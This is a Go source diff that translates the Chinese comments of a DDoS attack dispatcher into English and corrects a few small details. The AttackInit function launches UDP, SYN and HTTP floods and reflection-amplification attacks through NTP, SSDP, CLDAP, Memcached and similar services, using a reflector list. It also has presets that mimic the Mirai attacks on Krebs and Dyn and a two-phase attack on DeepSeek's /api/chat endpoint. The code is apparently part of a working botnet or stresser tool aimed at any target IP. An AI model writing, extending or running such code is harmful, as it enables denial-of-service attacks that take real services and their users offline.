@@ -7,23 +7,23 @@ import (
 	"strings"
 )
 
-// ResetStopChannel 全局变量，用于确认是否已经初始化了停止通道
+// stopChannelInitialized Global variable to confirm if the stop channel has been initialized
 var stopChannelInitialized = false
 
-// AttackInit 初始化攻击
+// AttackInit Initialize attack
 func AttackInit(method string, dstip string, dstport int, path string) {
-	// 重新初始化停止通道
+	// Reinitialize the stop channel
 	attack.ResetStopChannel()
 	
 	switch method {
 	case "STOP":
-		// 停止攻击
+		// Stop attack
 		close(attack.STOP)
-		log.Println("停止所有攻击")
+		log.Println("Stopped all attacks")
 		return
 
-	// Layer4 攻击
-	case "UDP", "DNS", "DNSA", "SYN", "RDP", "CLDAP", "MEMCACHED", "ARD", "NTP", "SSDP", "CHARGEN", "SNMP", "QUIC", "OPENVPN", "TFTP","DNSBOMB","DNSBOOMERANG":
+	// Layer4 attacks
+	case "UDP", "DNS", "DNSA", "SYN", "RDP", "CLDAP", "MEMCACHED", "ARD", "NTP", "SSDP", "CHARGEN", "SNMP", "QUIC", "OPENVPN", "TFTP", "DNSBOMB", "DNSBOOMERANG":
 		attack4 := attack.Layer4{
 			Method:      method,
 			DstIP:       dstip,
@@ -32,15 +32,15 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 			AmpFile:     "serverfile/reflector.txt",
 		}
 		
-		// 对特定攻击方法自定义参数
+		// Custom parameters for specific attack methods
 		if method == "DNS" || method == "DNSA" {
-			attack4.Reservedfield = "example.com" // 默认域名查询
+			attack4.Reservedfield = "example.com" // Default domain query
 		}
 		
 		go attack4.StartAttack()
 
-	// Layer7 攻击
-	case "GET","POST","LOGIN","COOKIE":
+	// Layer7 attacks
+	case "GET", "POST", "LOGIN", "COOKIE":
 		target := formatTarget(dstip, dstport)
 		attack7 := attack.HTTP{
 			Method:    method,
@@ -50,8 +50,8 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 		}
 		go attack7.HTTPStart()
 
-	// 僵尸网络模拟
-	case "MIRAI_1":	   // Mirai僵尸网络攻击,使用UDP和DNS泛洪。模拟Krebs被打
+	// Botnet simulation
+	case "MIRAI_1": // Mirai botnet attack, using UDP and DNS flood. Simulates the attack on Krebs
 		udp := attack.Layer4{
 			Method:      "UDP",
 			DstIP:       dstip,
@@ -77,8 +77,7 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 		go dns.StartAttack()
 		go syn.StartAttack()
 
-
-	case "MIRAI_2":	   // Mirai僵尸网络攻击,模拟Dyn被打
+	case "MIRAI_2": // Mirai botnet attack, simulates the attack on Dyn
 		syn := attack.Layer4{ 
 			Method:      "SYN",
 			DstIP:       dstip,
@@ -87,7 +86,7 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 			AmpFile:     "serverfile/reflector.txt",
 		}
 		dns := attack.Layer4{
-			Method:      "dns",
+			Method:      "DNS",
 			DstIP:       dstip,
 			DstPort:     dstport,
 			ThreadCount: 7,
@@ -96,7 +95,7 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 		go syn.StartAttack()
 		go dns.StartAttack()
 
-	case "DEEPSEEK_1": // 第一阶段NTP、SSDP、CLDAP反射放大
+	case "DEEPSEEK_1": // Phase 1 NTP, SSDP, CLDAP reflection amplification
 		ntp := attack.Layer4{
 			Method:      "NTP",
 			DstIP:       dstip,
@@ -121,9 +120,9 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 		go ntp.StartAttack()
 		go ssdp.StartAttack()
 		go cldap.StartAttack()
-	case "DEEPSEEK_2": // 第二阶段HTTP攻击
+	case "DEEPSEEK_2": // Phase 2 HTTP attack
 		target := formatTarget(dstip, dstport)
-		// 检查path是否为空，如果为空则设置为"/chat"
+		// Check if path is empty, if so set it to "/api/chat"
 		if path == "" {
 			path = "/api/chat"
 		}
@@ -136,18 +135,18 @@ func AttackInit(method string, dstip string, dstport int, path string) {
 		go attack7.HTTPStart()
 
 	default:
-		log.Printf("未知攻击方法: %s", method)
+		log.Printf("Unknown attack method: %s", method)
 	}
 }
 
-// 格式化目标URL
+// Format target URL
 func formatTarget(dstip string, dstport int) string {
-	// 检查IP是否已经是URL格式
+	// Check if IP is already in URL format
 	if strings.HasPrefix(dstip, "http://") || strings.HasPrefix(dstip, "https://") {
-		// 已经是URL格式，直接返回
+		// Already in URL format, return directly
 		return dstip
 	}
 	
-	// 构建基本的HTTP URL
+	// Construct basic HTTP URL
 	return fmt.Sprintf("http://%s:%d", dstip, dstport)
 }
